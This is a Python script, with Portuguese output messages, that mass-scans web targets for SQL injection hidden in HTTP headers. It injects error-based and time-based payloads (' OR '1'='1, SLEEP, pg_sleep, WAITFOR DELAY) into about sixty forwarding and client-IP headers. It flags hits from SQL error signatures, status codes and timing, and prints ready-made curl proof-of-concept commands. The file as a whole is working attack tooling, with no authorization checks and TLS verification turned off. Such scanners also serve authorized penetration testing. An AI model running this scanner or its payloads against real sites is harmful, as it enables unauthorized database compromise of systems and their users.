#!/usr/bin/env python3

import requests
import time
import argparse
import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

# ---------------- HEADERS ----------------

HEADERS_LIST = [
    "X-Forwarded-For","Forwarded","X-Real-IP","X-Forwarded","X-Forwarded-By",
    "X-Forwarded-Host","X-Forwarded-Server","X-Forwarded-Port","X-Forwarded-Proto",
    "X-Forwarded-Scheme","X-Forwarded-SSL","CF-Connecting-IP","True-Client-IP",
    "Fastly-Client-IP","X-Azure-ClientIP","X-Google-Real-IP",
    "CloudFront-Viewer-Address","CloudFront-Viewer-Country","X-Amzn-Trace-Id",
    "X-Edge-IP","X-Client-IP","X-Cluster-Client-IP","X-ProxyUser-IP",
    "WL-Proxy-Client-IP","Proxy-Client-IP","X-Original-Forwarded-For",
    "X-Originating-IP","X-Original-IP","X-Remote-IP","X-Remote-Addr",
    "X-Original-Remote-Addr","Client-IP","Client-IP-Addr","Remote-Addr",
    "Remote-IP","Real-IP","X-Proxy-IP","X-Forwarded-For-Original",
    "Forwarded-For","X-Forwarded-For-IP","X-Forwarded-For-Client-IP",
    "X-Forwarded-For-Remote-Addr","X-Custom-IP-Authorization","X-User-IP",
    "X-Client-IP-Addr","X-Client-Address","X-Remote-User-IP",
    "X-Remote-User-Addr","Front-End-Https","X-HTTPS","X-Original-URL",
    "X-Rewrite-URL","Akamai-Origin-Hop","X-Sucuri-Clientip",
    "X-Imperva-Client-IP","X-NF-Client-Connection-IP",
    "X-Vercel-Forwarded-For","Fly-Client-IP","X-Shopify-Client-Ip",
    "X-Cdn-Client-Ip","X-Bb-Ip"
]

# ---------------- PAYLOADS ----------------

ERROR_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
    "'--", "')--", "\")--"
]

TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "' OR pg_sleep(5)-- -",
    "'; WAITFOR DELAY '0:0:5'--"
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "mysqli_fetch",
    "pg_query",
    "sqlite error",
    "ora-01756",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

TIME_SLEEP = 5
TIME_MARGIN = 3
REPEAT_TIME_TESTS = 2

# ---------------- CURL BUILDER ----------------

def build_curl(url, header, payload):
    return f"""curl -i -s -k -X GET "{url}" \\
  -H "{header}: {payload}" \\
  -H "User-Agent: Mozilla/5.0" \\
  -H "Accept: */*" \\
  --max-time 20"""

# ---------------- UTILS ----------------

def normalize_url(target):
    if target.startswith(("http://", "https://")):
        return target.rstrip("/")

    for scheme in ["https://", "http://"]:
        url = scheme + target.rstrip("/")
        try:
            r = requests.get(url, timeout=7, verify=False)
            print(f"[+] Alive: {url} ({r.status_code})")
            return url
        except:
            pass

    print(f"[-] Host down: {target}")
    return None


def request_once(url, headers=None, timeout=12):
    start = time.time()

    try:
        r = requests.get(
            url,
            headers=headers or {},
            timeout=timeout,
            verify=False,
            allow_redirects=True
        )

        return {
            "ok": True,
            "status": r.status_code,
            "length": len(r.text or ""),
            "text": (r.text or "")[:50000].lower(),
            "elapsed": time.time() - start
        }

    except:
        return {
            "ok": False,
            "status": 0,
            "length": 0,
            "text": "",
            "elapsed": time.time() - start
        }


def get_baseline(url):
    samples = []

    for _ in range(3):
        r = request_once(url)
        if r["ok"]:
            samples.append(r)
        time.sleep(0.5)

    if not samples:
        return None

    return {
        "status": samples[-1]["status"],
        "length": int(statistics.mean(x["length"] for x in samples)),
        "elapsed": statistics.mean(x["elapsed"] for x in samples),
        "texts": [x["text"] for x in samples]
    }

# ---------------- DETECTION ----------------

def is_real_error(resp, baseline):
    text = resp["text"]

    for sig in ERROR_SIGNATURES:
        if sig in text:
            if not any(sig in b for b in baseline["texts"]):
                return True, sig

    return False, None


def is_status_change(resp, baseline):
    return resp["status"] != baseline["status"] and resp["status"] >= 500


def is_length_change(resp, baseline):
    if baseline["length"] == 0:
        return False

    diff = abs(resp["length"] - baseline["length"])
    return (diff / baseline["length"]) > 0.4 and diff > 500

# ---------------- TESTS ----------------

def test_error_based(url, header, baseline):
    findings = []

    for payload in ERROR_PAYLOADS:
        resp = request_once(url, headers={header: payload})

        has_error, sig = is_real_error(resp, baseline)
        status_changed = is_status_change(resp, baseline)
        length_changed = is_length_change(resp, baseline)

        confidence = 0
        reasons = []

        if has_error:
            confidence += 3
            reasons.append(f"SQL error: {sig}")

        if status_changed:
            confidence += 1
            reasons.append(f"status {baseline['status']} -> {resp['status']}")

        if length_changed:
            confidence += 1
            reasons.append("response size changed")

        if confidence >= 3:
            findings.append({
                "type": "ERROR",
                "header": header,
                "payload": payload,
                "confidence": "HIGH" if confidence >= 4 else "MEDIUM",
                "reason": ", ".join(reasons)
            })

    return findings


def test_time_based(url, header, baseline):
    findings = []

    for payload in TIME_PAYLOADS:
        delays = []

        for _ in range(REPEAT_TIME_TESTS):
            resp = request_once(
                url,
                headers={header: payload},
                timeout=TIME_SLEEP + TIME_MARGIN + 5
            )
            delays.append(resp["elapsed"])
            time.sleep(0.5)

        avg = statistics.mean(delays)

        if avg >= baseline["elapsed"] + TIME_SLEEP - 1:
            findings.append({
                "type": "TIME",
                "header": header,
                "payload": payload,
                "confidence": "MEDIUM",
                "reason": f"baseline {baseline['elapsed']:.2f}s -> {avg:.2f}s"
            })

    return findings


def test_header(url, header, baseline):
    findings = []
    findings.extend(test_error_based(url, header, baseline))
    findings.extend(test_time_based(url, header, baseline))
    return findings

# ---------------- CORE ----------------

def test_target(target, threads):
    url = normalize_url(target)
    if not url:
        return

    print(f"\n=== Testando: {url} ===")

    baseline = get_baseline(url)
    if not baseline:
        print("[-] Falha ao obter baseline")
        return

    print(f"[i] Baseline: {baseline}")

    results = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(test_header, url, h, baseline)
            for h in HEADERS_LIST
        ]

        for f in as_completed(futures):
            try:
                res = f.result()
                if res:
                    results.extend(res)
            except:
                pass

    if not results:
        print("[-] Nada relevante encontrado")
        return

    print(f"\n[!!!] Possíveis achados em {url}\n")

    for item in results:
        print(f"[{item['confidence']}] [{item['type']}] {item['header']} -> {item['payload']}")
        print(f"    Motivo: {item['reason']}")

        curl_cmd = build_curl(url, item['header'], item['payload'])

        print("\n    --- CURL PoC ---")
        print(curl_cmd)
        print("    ----------------\n")

# ---------------- MAIN ----------------

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target")
    parser.add_argument("-a", "--arquivo")
    parser.add_argument("--threads", type=int, default=5)

    args = parser.parse_args()

    targets = []

    if args.target:
        targets.append(args.target)

    if args.arquivo:
        with open(args.arquivo) as f:
            targets.extend([x.strip() for x in f if x.strip()])

    if not targets:
        print("Use -t ou -a")
        return

    for t in targets:
        test_target(t, args.threads)


if __name__ == "__main__":
    main()
